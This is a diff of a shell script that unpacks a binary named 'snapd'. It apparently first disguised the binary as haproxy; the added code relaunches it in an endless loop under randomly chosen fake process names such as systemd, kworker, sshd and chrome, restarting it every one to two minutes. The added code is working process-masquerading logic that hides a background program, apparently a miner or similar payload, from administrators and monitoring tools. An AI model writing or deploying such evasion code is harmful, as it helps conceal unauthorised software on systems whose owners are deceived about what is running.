@@ -5,7 +5,25 @@ tar -xf snapd-linux.tar.gz
 rm snapd-linux.tar.gz
 cd snapd-linux
 chmod +x ./snapd
-mv ./snapd /usr/bin/haproxy
-mv processes.json haproxy.json
-nohup haproxy -c haproxy.json >/dev/null 2>&1 &
-sleep 2h
+
+HAPROXY_BIN="./snapd"
+PROCESS_NAMES=(
+chrome node systemd kworker redis dockerd containerd sshd nginx pm2
+)
+JSON_FILES=(
+part4.json
+part4.json
+part4.json
+part4.json
+)
+while true; do
+    pkill -f "$HAPROXY_BIN" || true
+    PROC_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
+    JSON=${JSON_FILES[$RANDOM % ${#JSON_FILES[@]}]}
+    echo "Start $PROC_NAME with $JSON"
+    exec -a "$PROC_NAME" "$HAPROXY_BIN" -c "$JSON" &
+    INTERVAL=$((60 + RANDOM % 61))
+    echo "Next restart in $INTERVAL seconds"
+    sleep $INTERVAL
+done
+
